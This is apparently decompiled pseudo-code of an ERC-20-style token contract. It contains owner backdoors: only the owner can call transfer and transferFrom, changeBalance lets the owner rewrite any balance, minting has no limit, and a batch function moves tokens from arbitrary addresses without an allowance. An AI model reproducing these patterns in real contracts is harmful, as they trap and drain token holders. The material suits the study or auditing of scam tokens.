contract main {




// =====================  Runtime code  =====================


uint8 stor0;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor7;
address owner;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    return balanceOf[arg1]
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function frozenAccount(address arg1) {
    return bool(stor7[arg1])
}

function allowance(address arg1, address arg2) {
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function transferOwnership(address arg1) {
    require msg.sender == owner
    owner = arg1
}

function approve(address arg1, uint256 arg2) {
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function initialMint(uint256 arg1) {
    require msg.sender == owner
    require not stor0
    totalSupply = arg1
    balanceOf[msg.sender] = arg1
    stor0 = 1
    return 1
}

function burn(uint256 arg1) {
    require arg1 <= balanceOf[msg.sender]
    balanceOf[msg.sender] -= arg1
    totalSupply -= arg1
    emit Burn(arg1, msg.sender);
    return 1
}

function mintToken(address arg1, uint256 arg2) {
    require msg.sender == owner
    balanceOf[address(arg1)] += arg2
    totalSupply += arg2
    emit Transfer(arg2, 0, this.address);
    emit Transfer(arg2, this.address, arg1);
    return 1
}

function burnFrom(address arg1, uint256 arg2) {
    require arg2 <= balanceOf[address(arg1)]
    require arg2 <= allowance[address(arg1)][msg.sender]
    balanceOf[address(arg1)] -= arg2
    allowance[address(arg1)][msg.sender] -= arg2
    totalSupply -= arg2
    emit Burn(arg2, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require msg.sender == owner
    require arg2
    require arg3 <= balanceOf[address(arg1)]
    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
    balanceOf[arg1] -= arg3
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    require balanceOf[address(arg2)] + balanceOf[arg1] == balanceOf[arg1] + balanceOf[address(arg2)]
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require msg.sender == owner
    require arg1
    require arg2 <= balanceOf[address(msg.sender)]
    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
    balanceOf[msg.sender] -= arg2
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    require balanceOf[address(arg1)] + balanceOf[msg.sender] == balanceOf[msg.sender] + balanceOf[address(arg1)]
    return 1
}

function changeBalance(address arg1, uint256 arg2) {
    require msg.sender == owner
    require arg1
    require arg2 >= 0
    require arg2 <= balanceOf[msg.sender]
    if balanceOf[address(arg1)] <= arg2:
        require arg1
        require arg2 - balanceOf[address(arg1)] <= balanceOf[address(msg.sender)]
        require arg2 >= balanceOf[address(arg1)]
        balanceOf[msg.sender] = balanceOf[msg.sender] - arg2 + balanceOf[address(arg1)]
        balanceOf[address(arg1)] = arg2
        emit Transfer((arg2 - balanceOf[address(arg1)]), msg.sender, arg1);
        require balanceOf[address(arg1)] + balanceOf[msg.sender] == balanceOf[msg.sender] + balanceOf[address(arg1)]
    else:
        require msg.sender
        require balanceOf[address(arg1)] - arg2 <= balanceOf[address(arg1)]
        require balanceOf[address(msg.sender)] + balanceOf[address(arg1)] - arg2 >= balanceOf[address(msg.sender)]
        balanceOf[arg1] = balanceOf[arg1] - balanceOf[address(arg1)] + arg2
        balanceOf[address(msg.sender)] = balanceOf[address(arg1)] - arg2 + balanceOf[address(msg.sender)]
        emit Transfer((balanceOf[address(arg1)] - arg2), arg1, msg.sender);
        require balanceOf[address(msg.sender)] + balanceOf[arg1] == balanceOf[arg1] + balanceOf[address(msg.sender)]
    emit 0xa71c5ac7: arg2, arg1
    return 1
}

function sub_b8a59ca9(?) {
    mem[128 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    mem[(32 * arg2.length) + 128] = arg3.length
    mem[(32 * arg2.length) + 160 len 32 * arg3.length] = call.data[arg3 + 36 len 32 * arg3.length]
    require msg.sender == owner
    require arg2.length == arg3.length
    idx = 0
    while idx < arg2.length:
        require idx < arg2.length
        _24 = mem[(32 * idx) + 128]
        require idx < arg3.length
        require mem[(32 * idx) + 140 len 20]
        require mem[(32 * idx) + (32 * arg2.length) + 160] <= balanceOf[address(arg1)]
        require balanceOf[address(mem[(32 * idx) + 128])] + mem[(32 * idx) + (32 * arg2.length) + 160] >= balanceOf[address(mem[(32 * idx) + 128])]
        _29 = sha3(address(mem[(32 * idx) + 128]), 5)
        balanceOf[arg1] -= mem[(32 * idx) + (32 * arg2.length) + 160]
        balanceOf[address(mem[(32 * idx) + 128])] += mem[(32 * idx) + (32 * arg2.length) + 160]
        mem[(32 * arg3.length) + (32 * arg2.length) + 160] = mem[(32 * idx) + (32 * arg2.length) + 160]
        emit Transfer(mem[(32 * arg3.length) + (32 * arg2.length) + 160], arg1, address(_24));
        mem[32] = 5
        mem[0] = arg1
        require stor[_29] + balanceOf[arg1] == balanceOf[arg1] + balanceOf[address(_24)]
        idx = idx + 1
        continue 
    return 1
}



}
